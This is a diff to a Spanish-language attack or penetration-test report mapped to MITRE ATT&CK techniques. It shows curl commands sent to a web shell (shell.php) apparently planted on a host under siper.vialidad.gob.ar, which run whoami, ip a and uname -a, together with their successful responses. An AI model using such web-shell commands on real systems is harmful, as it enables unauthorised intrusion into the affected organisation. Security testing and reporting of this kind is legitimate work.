@@ -693,17 +693,19 @@ resultado:
    verificación:
 
   Desde el exterior, pruebo el web shell
+  
   ```text
-      curl -k "https://siper.vialidad.gob.ar/tmp/uploads/shell.php?cmd=whoami"
+  curl -k "https://siper.vialidad.gob.ar/tmp/uploads/shell.php?cmd=whoami"
   ```
    respuesta:
    Resultado exitoso: www-data
    
    
    Verificación de conectividad de red:
-    ```text
+  
+   ```text
        curl -k "https://siper.vialidad.gob.ar/tmp/uploads/shell.php?cmd=ip a show eth0"
-    ```
+   ```
 
     repuesta: 
     ```text
@@ -722,9 +724,10 @@ resultado:
       curl -k "https://siper.vialidad.gob.ar/tmp/uploads/shell.php?cmd=uname -a"
     ```
    respuesta:
-    ```text
+
+   ```text
       Linux siper-server 5.4.0-100-generic #113-Ubuntu SMP Thu Feb 3 18:43:29 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
-    ```
+   ```
 
  - T1573.001 Cifrado Simétrico
    Generación de clave AES-256:
